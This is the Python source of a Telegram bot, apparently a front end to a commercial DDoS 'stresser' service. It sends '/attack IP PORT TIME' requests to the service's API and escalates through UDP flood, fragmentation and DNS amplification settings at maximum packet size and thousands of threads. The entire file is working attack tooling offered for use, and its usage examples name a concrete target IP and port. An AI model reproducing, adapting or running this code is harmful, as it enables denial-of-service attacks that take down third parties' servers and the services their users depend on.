# app.py - UDP Big Packets with 20 Concurrent
import os
import logging
import asyncio
import threading
import aiohttp
import time
import json
import re
from datetime import datetime
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PORT = int(os.getenv("PORT", 8080))
MAX_CONCURRENT = 20  # Increased to 20

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== FLASK APP =====
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 Attack Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# ===== ATTACK MANAGER =====
class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.attack_counter = 0
        self.lock = threading.Lock()
        self.attack_logs = []
        self.total_attacks = 0
        self.concurrent_busy = 0
    
    def can_start_attack(self, user_id):
        with self.lock:
            user_attacks = sum(1 for a in self.active_attacks.values() if a['user_id'] == user_id)
            if user_attacks >= MAX_CONCURRENT:
                return False, f"❌ Concurrent busy: {user_attacks}/{MAX_CONCURRENT}"
            if len(self.active_attacks) >= 50:
                return False, "❌ Too many active attacks globally."
            return True, "OK"
    
    def start_attack(self, user_id, target, port, duration, method):
        with self.lock:
            self.attack_counter += 1
            attack_id = self.attack_counter
            self.total_attacks += 1
            self.concurrent_busy = len(self.active_attacks) + 1
            self.active_attacks[attack_id] = {
                'id': attack_id,
                'user_id': user_id,
                'target': target,
                'port': port,
                'duration': duration,
                'method': method,
                'start_time': datetime.now(),
                'status': 'running'
            }
            return attack_id
    
    def stop_attack(self, attack_id):
        with self.lock:
            if attack_id in self.active_attacks:
                self.active_attacks[attack_id]['status'] = 'stopped'
                self.concurrent_busy = max(0, self.concurrent_busy - 1)
                return True
            return False
    
    def get_active_attacks(self, user_id=None):
        with self.lock:
            if user_id:
                return {aid: att for aid, att in self.active_attacks.items() if att['user_id'] == user_id and att['status'] == 'running'}
            return {aid: att for aid, att in self.active_attacks.items() if att['status'] == 'running'}
    
    def get_stats(self):
        with self.lock:
            active = len([a for a in self.active_attacks.values() if a['status'] == 'running'])
            return {
                'active': active,
                'concurrent_busy': self.concurrent_busy,
                'total': self.total_attacks,
                'max': MAX_CONCURRENT
            }
    
    def log_attack(self, user_id, target, port, duration, method, status, response):
        self.attack_logs.append({
            'user_id': user_id,
            'target': target,
            'port': port,
            'duration': duration,
            'method': method,
            'status': status,
            'response': response[:500],
            'timestamp': datetime.now()
        })
    
    def cleanup(self):
        with self.lock:
            now = datetime.now()
            to_remove = []
            for aid, att in self.active_attacks.items():
                if att['status'] == 'stopped':
                    to_remove.append(aid)
                elif (now - att['start_time']).seconds > att['duration'] + 15:
                    to_remove.append(aid)
            for aid in to_remove:
                del self.active_attacks[aid]
                self.concurrent_busy = max(0, self.concurrent_busy - 1)

attack_manager = AttackManager()

# ===== UDP BIG PACKET ATTACK =====
async def send_udp_big_packet(target, port, duration):
    """
    UDP Attack with BIG PACKETS - Maximum Power
    Big packets = 65500 bytes (max UDP size)
    """
    url = "https://api.susstresser.com/panel/api/api.php"
    
    # Big packet attack configurations - Only UDP
    attack_configs = [
        # UDP with maximum packet size
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": "udp",
            "threads": 5000,
            "pps": 5000000,
            "bps": 5000000000,
            "size": 65500,  # Maximum UDP packet size
            "random": "true",
            "timeout": 1
        },
        # UDP Flood with big packets
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": "udp",
            "threads": 4000,
            "pps": 4000000,
            "bps": 4000000000,
            "size": 65000,
            "random": "true"
        },
        # UDP with fragmentation
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": "udp",
            "threads": 3000,
            "pps": 3000000,
            "bps": 3000000000,
            "size": 65500,
            "frag": "true",
            "random": "true"
        },
        # UDP Big Packets + Amplification
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": "udp",
            "threads": 2500,
            "pps": 2500000,
            "bps": 2500000000,
            "size": 65500,
            "amplification": "true",
            "type": "dns"
        }
    ]
    
    results = []
    success_count = 0
    
    for i, config in enumerate(attack_configs):
        try:
            timeout = aiohttp.ClientTimeout(total=duration + 20)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                start_time = time.time()
                
                # Try GET first
                async with session.get(url, params=config) as response:
                    elapsed = time.time() - start_time
                    result_text = await response.text()
                    
                    is_success = (
                        response.status == 200 and 
                        ("SUCCESS" in result_text or 
                         "sent" in result_text.lower() or
                         "attack" in result_text.lower() or
                         "Host:" in result_text)
                    )
                    
                    if is_success:
                        success_count += 1
                    
                    results.append({
                        'config': i + 1,
                        'type': 'GET',
                        'status': response.status,
                        'elapsed': f"{elapsed:.2f}s",
                        'success': is_success,
                        'response': result_text[:300]
                    })
                    
                    logger.info(f"UDP Big Packet {i+1}: Status {response.status}, Success: {is_success}")
                    
                    if is_success:
                        return {
                            "success": True,
                            "config_used": i + 1,
                            "params_used": config,
                            "status_code": response.status,
                            "elapsed": f"{elapsed:.2f}s",
                            "response": result_text[:500],
                            "full_response": result_text,
                            "attempts": results,
                            "packet_size": config.get('size', 65500),
                            "threads": config.get('threads', 5000)
                        }
                    
                    await asyncio.sleep(0.2)
                    
        except Exception as e:
            logger.error(f"UDP config {i+1} failed: {e}")
            results.append({
                'config': i + 1,
                'success': False,
                'error': str(e)
            })
    
    # If all failed, return last result
    if results:
        return {
            "success": False,
            "attempts": results,
            "message": f"Tried {len(results)} UDP configurations, all failed"
        }
    
    return {"success": False, "error": "No response from API"}

# ===== BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = attack_manager.get_stats()
    
    keyboard = [
        [InlineKeyboardButton("💥 UDP ATTACK", callback_data="attack")],
        [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
        [InlineKeyboardButton("👤 MY INFO", callback_data="info")]
    ]
    
    if update.effective_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    await update.message.reply_text(
        f"⚡ *UDP BIG PACKET ATTACK BOT*\n\n"
        f"🔥 Status: ONLINE\n"
        f"⚡ Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📊 Total Attacks: {stats['total']}\n"
        f"📦 Packet Size: 65,500 bytes (MAX)\n"
        f"💪 Threads: 5,000 per attack\n\n"
        f"📌 *How to use:*\n"
        f"`/attack IP PORT TIME`\n\n"
        f"Example: `/attack 91.108.17.19 32001 60`\n\n"
        f"⏱️ Time: 60-300 seconds\n"
        f"📡 Method: UDP (Big Packets only)\n"
        f"⚡ Max Concurrent: 20",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /attack command - UDP Big Packets only"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can use /attack.")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ *Usage:* `/attack IP PORT TIME`\n\n"
            "Example: `/attack 91.108.17.19 32001 60`\n\n"
            "📦 UDP Big Packets (65,500 bytes)\n"
            "💪 5,000 threads per attack\n"
            "⚡ 20 concurrent attacks\n"
            "⏱️ Time: 60-300 seconds",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        # Validate duration
        if duration < 60:
            await update.message.reply_text("❌ Minimum duration is 60 seconds!")
            return
        if duration > 300:
            await update.message.reply_text("❌ Maximum duration is 300 seconds!")
            return
        
        # Check concurrent
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            return
        
        # Start attack
        status_msg = await update.message.reply_text(
            f"🚀 *UDP BIG PACKET ATTACK STARTED*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Port: `{port}`\n"
            f"⏱️ Time: `{duration}s`\n"
            f"📦 Packet Size: `65,500 bytes`\n"
            f"💪 Threads: `5,000`\n"
            f"📊 Concurrent: {attack_manager.concurrent_busy}/{MAX_CONCURRENT}\n\n"
            f"⏳ Sending UDP flood with big packets...",
            parse_mode='Markdown'
        )
        
        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp")
        
        # Send UDP big packet attack
        result = await send_udp_big_packet(target, port, duration)
        
        # Log attack
        attack_manager.log_attack(
            user_id, target, port, duration, "udp",
            "success" if result.get('success') else "failed",
            str(result)
        )
        
        # Build response
        if result.get('success'):
            response_text = (
                f"✅ *UDP BIG PACKET ATTACK SUCCESSFUL!*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📦 Packet Size: `{result.get('packet_size', 65500)} bytes`\n"
                f"💪 Threads: `{result.get('threads', 5000)}`\n"
                f"📊 Attack ID: `{attack_id}`\n"
                f"⚡ Status: ✅ SUCCESS\n"
                f"⏱️ Response Time: {result.get('elapsed', 'N/A')}\n\n"
            )
        else:
            response_text = (
                f"❌ *UDP BIG PACKET ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Attack ID: `{attack_id}`\n"
                f"⚡ Status: ❌ FAILED\n\n"
            )
        
        # Add attempts info
        if result.get('attempts'):
            attempts = result['attempts']
            total = len(attempts)
            successful = sum(1 for a in attempts if a.get('success'))
            
            response_text += f"📊 *Tried {total} UDP configs, {successful} successful*\n\n"
            
            # Show last 5 attempts
            for attempt in attempts[-5:]:
                status = "✅" if attempt.get('success') else "❌"
                config_num = attempt.get('config', 'N/A')
                response_text += f"{status} Config {config_num}: {attempt.get('status', 'N/A')}\n"
        
        # Add response preview
        if result.get('response'):
            response_text += f"\n📡 *API Response:*\n```\n{result['response'][:200]}\n```"
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
        
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid port or time! Use numbers.\nError: {e}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Attack from button"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "💥 *UDP BIG PACKET ATTACK*\n\n"
        "Send in this format:\n"
        "`IP PORT TIME`\n\n"
        "Example: `91.108.17.19 32001 60`\n\n"
        "📦 UDP Big Packets (65,500 bytes)\n"
        "💪 5,000 threads\n"
        "⚡ 20 concurrent max\n"
        "⏱️ Time: 60-300 seconds\n\n"
        "Send /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process attack from button"""
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can attack.")
        context.user_data['awaiting_attack'] = False
        return
    
    try:
        parts = update.message.text.split()
        if len(parts) < 3:
            await update.message.reply_text(
                "❌ Use: `IP PORT TIME`\n"
                "Example: `91.108.17.19 32001 60`",
                parse_mode='Markdown'
            )
            return
        
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            context.user_data['awaiting_attack'] = False
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 UDP Big Packet attack on {target}:{port} for {duration}s..."
        )
        
        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp")
        result = await send_udp_big_packet(target, port, duration)
        
        if result.get('success'):
            response_text = (
                f"✅ *UDP BIG PACKET SUCCESS!*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📦 Packet: `65,500 bytes`\n"
                f"📊 Attack ID: `{attack_id}`\n"
            )
        else:
            response_text = (
                f"❌ *ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Attack ID: `{attack_id}`\n"
            )
        
        if result.get('response'):
            response_text += f"\n📡 Response: {result['response'][:200]}"
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_attack'] = False

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = attack_manager.get_stats()
    active = attack_manager.get_active_attacks()
    
    await update.message.reply_text(
        f"📊 *BOT STATUS*\n\n"
        f"⚡ Active: {stats['active']}\n"
        f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📈 Total Attacks: {stats['total']}\n"
        f"📦 Packet Size: 65,500 bytes\n"
        f"💪 Threads: 5,000\n"
        f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
        f"🌐 Status: ONLINE\n\n"
        f"📌 /attack IP PORT TIME",
        parse_mode='Markdown'
    )

async def active_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    active = attack_manager.get_active_attacks(query.from_user.id)
    stats = attack_manager.get_stats()
    
    if not active:
        text = f"📊 *NO ACTIVE ATTACKS*\n\nConcurrent: {stats['concurrent_busy']}/{stats['max']}"
    else:
        text = f"📊 *ACTIVE ATTACKS ({len(active)})*\nConcurrent: {stats['concurrent_busy']}/{stats['max']}\n\n"
        for aid, att in active.items():
            elapsed = (datetime.now() - att['start_time']).seconds
            remaining = max(0, att['duration'] - elapsed)
            text += f"🔹 ID: `{aid}` - {att['target']}:{att['port']} - {remaining}s left\n"
    
    keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        f"👤 *USER INFO*\n\n"
        f"🆔 ID: `{query.from_user.id}`\n"
        f"⭐ Level: {'ADMIN' if query.from_user.id == OWNER_ID else 'USER'}\n"
        f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
        f"📦 Packet Size: 65,500 bytes\n"
        f"💪 Threads: 5,000\n"
        f"📡 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n\n"
        f"📌 *Method:* UDP Big Packets only",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        await query.answer("Access denied!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton("📊 ACTIVE", callback_data="admin_active")],
        [InlineKeyboardButton("📈 STATS", callback_data="admin_stats")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "⚙️ *ADMIN PANEL*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def admin_active(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    active = attack_manager.get_active_attacks()
    stats = attack_manager.get_stats()
    
    if not active:
        text = f"📊 *NO ACTIVE ATTACKS*\n\nConcurrent: {stats['concurrent_busy']}/{stats['max']}"
    else:
        text = f"📊 *ACTIVE ATTACKS ({len(active)})*\nConcurrent: {stats['concurrent_busy']}/{stats['max']}\n\n"
        for aid, att in active.items():
            elapsed = (datetime.now() - att['start_time']).seconds
            remaining = max(0, att['duration'] - elapsed)
            text += f"🔹 ID: `{aid}` - {att['target']}:{att['port']} - {remaining}s left\n"
    
    await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]]))

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    stats = attack_manager.get_stats()
    await query.edit_message_text(
        f"📈 *BOT STATISTICS*\n\n"
        f"⚡ Active: {stats['active']}\n"
        f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📈 Total Attacks: {stats['total']}\n"
        f"📦 Packet: 65,500 bytes\n"
        f"💪 Threads: 5,000\n"
        f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
        f"🌐 Status: ONLINE",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
    )

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    stats = attack_manager.get_stats()
    
    keyboard = [
        [InlineKeyboardButton("💥 UDP ATTACK", callback_data="attack")],
        [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
        [InlineKeyboardButton("👤 MY INFO", callback_data="info")]
    ]
    
    if query.from_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    await query.edit_message_text(
        f"⚡ *MAIN MENU*\n\n"
        f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📈 Total: {stats['total']}\n"
        f"📦 Packet: 65,500 bytes\n"
        f"🌐 Status: ONLINE",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

# ===== RUN BOT =====
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("cancel", cancel))
    
    # Callbacks
    app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    app.add_handler(CallbackQueryHandler(active_callback, pattern="^active$"))
    app.add_handler(CallbackQueryHandler(info_callback, pattern="^info$"))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
    app.add_handler(CallbackQueryHandler(admin_active, pattern="^admin_active$"))
    app.add_handler(CallbackQueryHandler(admin_stats, pattern="^admin_stats$"))
    app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    
    # Messages
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("✅ Bot started!")
    loop.run_forever()

if __name__ == "__main__":
    print("=" * 50)
    print("⚡ UDP BIG PACKET ATTACK BOT")
    print("📦 Packet Size: 65,500 bytes")
    print("⚡ Concurrent: 20")
    print("=" * 50)
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    logger.info("✅ Bot thread started")
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)